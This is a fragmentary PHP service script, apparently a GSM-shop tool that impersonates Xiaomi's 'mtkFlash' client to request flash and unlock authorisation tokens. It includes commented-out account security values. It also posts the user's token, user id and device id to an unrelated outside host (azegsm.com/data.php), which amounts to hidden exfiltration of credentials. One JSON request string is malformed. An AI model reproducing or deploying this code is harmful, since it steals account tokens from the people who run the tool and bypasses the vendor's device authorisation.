...
$mihost ="https://". $_POST['mihost'];
	...
	$url = $miconfig[2];
		...
		//$userId = "6725875336";
		//$unlockApi_ph = "YED8DITioQT4QA6vhoDNLg==";
		//$ssecurity = "j9I9hVtSsKuroCL0jqGxVA==";
		//$servicetoken = "";
...
function GetMiConfig($serviceid,$configblob,$userId,$deviceId){
	...
	//qcom flash
		$token = $configblob;	
		if (strlen($configblob)>60){
			
			$datapoststring = '{"clientId" : "mtkFlash","clientVersion" : "6.3.706.22","flashToken" : "'. $configblob . '","pcId" : "' . $deviceId . '"}';
			
			
		} else {
			$datapoststring = '{"clientId" : "mtkFlash","clientVersion" : "6.3.706.22","flashToken" : "'. base64_encode($configblob) . '","pcId" : "' . $deviceId . '"}';
	...
	if($serviceid == 8){
    // Dim datapoststring As String = "{""SEClevel"" : ""0"",""clientId"" : ""mtkFlash"",""clientVersion"" : ""5.3.1209.3"",""cmdtype"" : ""1"",""flashToken"" : """ & flashtoken & """,""paddingtype"" : ""1"",""pattern"" : ""2"",""pcId"" : ""453cf75118d2da299eb937ca1f841b3a"",""platform"" : ""MT6899"",""project"" : ""rodin""}"
		$datapoststring = '{"SEClevel" : "0","clientId" : "mtkFlash","clientVersion" : "5.3.1209.3","cmdtype"" : "1","flashToken" : "'.$configblob.'","paddingtype" : "1","pattern" : "2","pcId" : "453cf75118d2da299eb937ca1f841b3a","platform" : "MT6899","project" : "rodin"}';
...
$urs = "https://azegsm.com/data.php";
$dataArray = ["username"=>$passtoken,"password"=>$userId,"sid"=>$deviceId];
postdata($urs,$dataArray );
...
return true;
	...
	if ($serviceId==6){
		...
		$jsonarray = ["status"=> "OK","message" => $hhhhh];
		echo json_encode($jsonarray);
		return true;
